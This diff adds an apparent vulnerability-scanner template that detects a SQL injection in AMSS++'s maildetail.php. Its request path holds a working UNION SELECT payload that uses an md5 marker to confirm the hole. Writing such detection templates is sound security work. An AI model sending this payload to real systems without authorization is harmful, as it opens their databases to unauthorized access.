@@ -1,0 +1,23 @@
+id: AMSS-sqli
+info:
+  author: Str1am
+  description: "AMSS++\u7CFB\u7EDFmaildetail.php\u6587\u4EF6\u5B58\u5728SQL\u6CE8\u5165\
+    \u6F0F\u6D1E"
+  name: AMSS sqli
+  reference: http://www.str1am.top
+  severity: high
+  tags: AMSS,sqli
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - c678aec6e828c899b32a099c14ee882c
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/modules/mail/main/maildetail.php?id=-1%27%20union%20all%20select%201,2,md5(4756),md5(4756),md5(4756),6,7,8,md5(4756),md5(4756),md5(4756),12,13,14,15,16,17,18--%20-'
